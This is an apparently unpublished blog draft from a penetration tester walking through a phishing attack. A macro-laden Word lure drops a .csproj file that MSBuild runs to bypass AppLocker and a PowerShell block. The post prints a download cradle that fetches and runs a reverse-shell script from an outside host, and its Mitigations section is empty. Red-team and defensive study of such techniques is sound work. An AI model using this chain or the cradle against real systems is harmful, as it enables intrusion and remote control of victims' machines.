---
layout: post
title: MSBuild AppLocker Bypass Phishing Payload
published: false
---
![msbuild]({{ site.url }}/images/msbuild-csproj.png){: .center-image }

### With regular external vulnerability scans and (hopefully) pentration tests being undertaken, the perimeter is typically not the easy route into an organisation.

People click, and despite simulated phishing campaigns and user awareness training there can never be complete assurance against credential divulgence or execution of malicious code.  So it is critically important that organisations implement a multi-layered "defence in depth" strategy. Application whitelisting is an important component of such a strategy, and is an effective means of ensuring that only approved applications can run.

AppLocker is a commonly used whitelisting technology and is built into Windows. The default AppLocker rules for Windows 10 are listed below.

![rules]({{ site.url }}/images/applocker-default-rules.png){: .center-image }

Since Powershell has gained recognition for being the attackers language of choice, many organisations are [increasingly] additionally blocking it. However, blocking powershell.exe is often not sufficient and there are many methods by which PowerShell can be instantiated to send a reverse shell reaching out of the organisation to an attacker.

The post will document one such method, with the "misplaced trust binary" MSBuild.exe. In this scenario, the company has enabled AppLocker with default rules and has also blocked Powershell.

![rules]({{ site.url }}/images/applocker-rules.png){: .center-image }

We can pass a ".csproj" (Visual Studio .NET C# Project file) to MSBuild and have it execute C# and instantiate a Powershell runspace using the System.Management.Automation.dll assembly. The powashell.csproj file below by Casey Smith ([@SubTee](https://twitter.com/subtee)) builds upon Jared Atkinson's ([@jaredcatkinson](https://twitter.com/jaredcatkinson)) and Justin Warner's ([@sixdub](https://twitter.com/sixdub)) work.

<script src="https://gist.github.com/egre55/7a6b6018c9c5ae88c63bdb23879df4d0.js"></script>

Within this the second stage is executed (PowerShell 3.0+ download cradle):

`pipeline.Commands.AddScript("IEX (iwr 'http://10.10.10.10/shell.ps1')");`

Shell.ps1:

<script src="https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3.js"></script>

Good. Now we need a means of delivering the project file and executing MSBuild. The macro below will do just this.

<script src="https://gist.github.com/egre55/563159175f8d6c1d31d7f3af77357549.js"></script>

In order to stand a chance of the macro being executed, we need to dress the document appropriately.

John Lambert (@JohnLaTwC) regularly shares interesting phishing lures and payloads, if you need inspiration for simulated phishing campaigns ;) . I find the "Document created in newer/older Office version" lures especially convincing. John has put together [this](https://t.co/OwH28ltngy) compendium of macro based lures, which is great for educating users about the different techniques attackers use.

FailedDeliveryNotification.docx:



Now that our "malicious" document has been created we can test it out.

Once the user opens the document and enables macros, the powashell.csproj is downloaded for MSBuild to execute, which in turn downloads and executes the Powershell reverse shell one-liner.

![rules]({{ site.url }}/images/shell.png){: .center-image }

This payload is also an effective means of bypassing PowerShell Contrained Language mode.

Improvements
Mitigations



